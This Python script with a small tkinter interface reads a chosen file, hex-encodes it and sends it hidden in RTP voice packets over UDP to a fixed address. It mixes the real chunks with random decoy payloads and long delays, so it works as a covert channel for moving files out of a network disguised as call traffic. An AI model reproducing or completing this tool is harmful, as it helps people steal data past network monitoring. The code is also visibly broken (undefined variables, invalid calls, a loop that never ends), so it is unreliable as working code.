import client
import binascii
import pyrtp.pyrtp as rtp
import tkinter as tk
import random
import socket
import time
import os,binascii

def rtp_send(file_content):
    lowest_port = 16384         #Both these values must be even
    max_port = 32766            #Even this one... Trust me.
    destination = "1.2.3.4"
    packets = 3
    packetization = 150         

    port = (random.randint(lowest_port/2,max_port/2)*2)       #Selects our RTP port by picking a random number between half the highest port value and half the lowest, and multiplying it by 2 to always get an even number
    print("Selected Port is: " + str(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    #print("Enter destination: ")
    sock.bind((destination_input.get(), 1447))


    #sequence_number = random.randint(1,9999)
    sequence_number = 54321
    #time_int = random.randint(1,9999)
    time_int = 12345

    while packets != 0:


        packets = packets - 1
        time_int = time_int + 1
        sequence_number = sequence_number + 1
        payload = file_content
        packet_vars = {'version' : 2, 'padding' : 0, 'extension' : 0, 'csi_count' : 0, 'marker' : 0, 'payload_type' : 8, 'sequence_number' : sequence_number, 'timestamp' : time_int, 'ssrc' : 185755418, 'payload' : payload}

        header_hex = rtp.GenerateRTPpacket(packet_vars)
        
        sock.sendto(bytes.fromhex(header_hex), (destination, port))
        
        time.sleep(float(packetization * 0.0001))
    sock.close()





def transition():
    
    client.call()


    #print("Enter file name to transfer: ")
    path = path_input.get()
    asterisk=''
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(32), b''):
            asterisk+=str(binascii.hexlify(chunk)).replace("b","").replace("'","")

    print(asterisk) #hexdump

    asterisk_part=[]

    for i, part in enumerate(asterisk):
        tmp+=part
        if i % 5 == 0 or asterisk.len()-i<5:
            asterisk_part.append(tmp)
                
    parts=len(asterisk_part)        
    while parts > 0:
        count = 0
        if i % 5 == 0:
            time.sleep(30)
            rtp_send(i)
        else:
            rtp_send(binascii.b2a_hex(os.urandom(asterisk.len()*5)))
        count += 1







"""
    lowest_port = 16384         #Both these values must be even
    max_port = 32766            #Even this one... Trust me.
    destination = "1.2.3.4"
    packets = 3
    packetization = 150         

    port = (random.randint(lowest_port/2,max_port/2)*2)       #Selects our RTP port by picking a random number between half the highest port value and half the lowest, and multiplying it by 2 to always get an even number
    print("Selected Port is: " + str(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    #print("Enter destination: ")
    sock.bind((destination_input.get(), 1447))


    #sequence_number = random.randint(1,9999)
    sequence_number = 54321
    #time_int = random.randint(1,9999)
    time_int = 12345

    while packets != 0:


        packets = packets - 1
        time_int = time_int + 1
        sequence_number = sequence_number + 1
        payload = asterisk
        packet_vars = {'version' : 2, 'padding' : 0, 'extension' : 0, 'csi_count' : 0, 'marker' : 0, 'payload_type' : 8, 'sequence_number' : sequence_number, 'timestamp' : time_int, 'ssrc' : 185755418, 'payload' : payload}

        header_hex = rtp.GenerateRTPpacket(packet_vars)
        
        sock.sendto(bytes.fromhex(header_hex), (destination, port))
        
        time.sleep(float(packetization * 0.0001))
    sock.close()
"""
window=tk.Tk()
label_destination = tk.Label(window, text="destination")
label_destination.pack()
destination_input = tk.Entry(window)
destination_input.pack()
label_path=tk.Label(window, text="Path to file")
label_path.pack()
path_input=tk.Entry(window)
path_input.pack()
button=tk.Button(text="OK", command=transition)
button.pack() 

window.mainloop()